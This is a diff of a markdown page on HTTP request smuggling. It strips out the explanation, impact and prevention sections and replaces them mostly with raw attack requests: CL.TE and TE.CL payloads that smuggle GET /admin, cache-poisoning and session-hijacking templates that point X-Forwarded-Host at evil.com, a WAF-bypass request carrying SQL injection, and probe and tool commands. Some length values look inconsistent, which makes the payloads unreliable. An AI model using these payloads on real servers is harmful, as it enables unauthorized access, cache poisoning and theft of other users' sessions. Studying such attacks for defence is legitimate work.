@@ -1,95 +1,109 @@
 # HTTP Request Smuggling
 
-HTTP request smuggling exploits differences in how front-end (reverse proxy, load balancer, CDN) and back-end servers parse HTTP requests, allowing an attacker to "smuggle" a request through the front-end to the back-end.
-
-## How It Works
-
-The front-end and back-end disagree on request boundaries. When one ends a request before the other, the remaining bytes are treated as the start of the next request.
-
 ## Attack Types
 
 ### CL.TE (Content-Length vs Transfer-Encoding)
-Front-end uses Content-Length, back-end uses Transfer-Encoding.
-
 ```http
 POST / HTTP/1.1
-Host: target.com
-Content-Length: 13
+Host: vulnerable.com
+Content-Length: 44
 Transfer-Encoding: chunked
 
 0
 
-SMUGGLED
+GET /admin HTTP/1.1
+X-Ignore: X
 ```
 
-### TE.CL (Transfer-Encoding vs Content-Length)
-Front-end uses Transfer-Encoding, back-end uses Content-Length.
+Front-end uses Content-Length, back-end uses Transfer-Encoding.
 
+### TE.CL
 ```http
 POST / HTTP/1.1
-Host: target.com
+Host: vulnerable.com
 Content-Length: 4
 Transfer-Encoding: chunked
 
-5c
-GPOST / HTTP/1.1
-Content-Length: 15
-
-x=1
+5b
+GET /admin HTTP/1.1
+X-Ignore: X
 0
 
 ```
 
-### TE.TE (Transfer-Encoding obfuscation)
-Both use Transfer-Encoding, but one can be tricked.
+Front-end uses Transfer-Encoding, back-end uses Content-Length.
 
+### TE.TE (Obfuscated TE)
 ```http
 Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
 Transfer-Encoding : chunked
 Transfer-Encoding: chunked
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-Transfer-Encoding:[tab]chunked
 ```
 
 ## Detection
 
-Send a smuggled prefix and observe if the next request is corrupted:
+```bash
+# Time-based detection
+# CL.TE probe
+curl -k -v --http1.1 "https://target.com/"   -H "Transfer-Encoding: chunked"   -d $'0
 
+'
+
+# Differential response probe
+# Send two requests in one connection
+```
+
+## Exploitation
+
+### Web Cache Poisoning
 ```http
-POST / HTTP/1.1
+# Smuggle request that returns cached malicious content
+GET / HTTP/1.1
 Host: target.com
-Content-Length: 6
+Content-Length: 0
 Transfer-Encoding: chunked
 
 0
 
-G
+GET /poison HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
 ```
 
-If the next request becomes "GPOST / HTTP/1.1 404", the endpoint is vulnerable.
+### WAF Bypass
+```http
+# Smuggle SQL/XSS payload past front-end WAF
+POST / HTTP/1.1
+Content-Length: 0
+Transfer-Encoding: chunked
 
-### Automated Detection
-- **Burp Suite** — HTTP Request Smuggler extension
-- **Smuggler** — Python tool by defparam
-- **Nuclei** — Smuggling templates
+0
 
-## Impact
+POST /search HTTP/1.1
+X: '; SELECT * FROM users--
+```
 
-- **Request hijacking** — Steal other users' requests
-- **Cache poisoning** — Poison CDN/proxy cache to serve malicious content
-- **Authentication bypass** — Access restricted endpoints
-- **WAF bypass** — Smuggled requests skip front-end inspection
-- **Session hijacking** — Steal cookies from other users' requests
+### User Session Hijacking
+```http
+# Captures subsequent user's request headers (cookies)
+POST / HTTP/1.1
+...
+Transfer-Encoding: chunked
 
-## Prevention
+0
 
-1. **Use HTTP/2** — Not vulnerable to smuggling (binary framing)
-2. **Front-end and back-end consistency** — Use same parser
-3. **Reject ambiguous requests** — Drop requests with conflicting CL/TE
-4. **Normalize Transfer-Encoding** — Reject obfuscated TE headers
-5. **Upgrade web servers** — Most recent patches fix known issues
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
 
----
+# Next user's request gets appended after the smuggled prefix
+```
 
-> **Next Section**: [Tools](../04-Tools/01-recon-tools.md)
+## Tooling
+
+```bash
+# HTTP Request Smuggler (Burp extension)
+# smuggle.py
+python3 smuggle.py -u https://target.com
+```
